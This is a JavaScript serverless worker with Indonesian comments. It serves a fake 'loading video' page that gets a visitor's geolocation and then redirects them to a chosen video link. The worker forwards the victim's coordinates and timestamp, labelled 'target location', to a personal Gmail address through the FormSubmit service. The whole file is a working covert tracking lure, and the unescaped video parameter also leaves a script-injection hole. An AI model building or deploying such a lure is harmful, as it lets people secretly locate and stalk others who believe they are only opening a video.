export default {
  async fetch(request) {
    const { searchParams } = new URL(request.url);
    const videoURL = searchParams.get("video") || "https://facebook.com";

    if (request.method === "POST") {
      const body = await request.json();

      // Kirim lokasi target ke email kamu via FormSubmit
      await fetch("https://formsubmit.co/ajax/sezyou407@gmail.com", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          subject: "Lokasi Target",
          pesan: `Lat: ${body.lat}, Lon: ${body.lon}, Waktu: ${body.time}`
        })
      });

      return new Response("Lokasi dikirim", { status: 200 });
    }

    return new Response(`
      <!DOCTYPE html>
      <html>
      <head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
      <body>
        <h3>Memuat video...</h3>
        <script>
          const videoURL = "${videoURL}";
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
              fetch(location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  lat: pos.coords.latitude,
                  lon: pos.coords.longitude,
                  time: new Date().toISOString()
                })
              }).finally(() => {
                setTimeout(() => window.location.href = videoURL, 1000);
              });
            }, () => {
              window.location.href = videoURL;
            });
          } else {
            window.location.href = videoURL;
          }
        </script>
      </body>
      </html>
    `, {
      headers: { "Content-Type": "text/html" }
    });
  }
}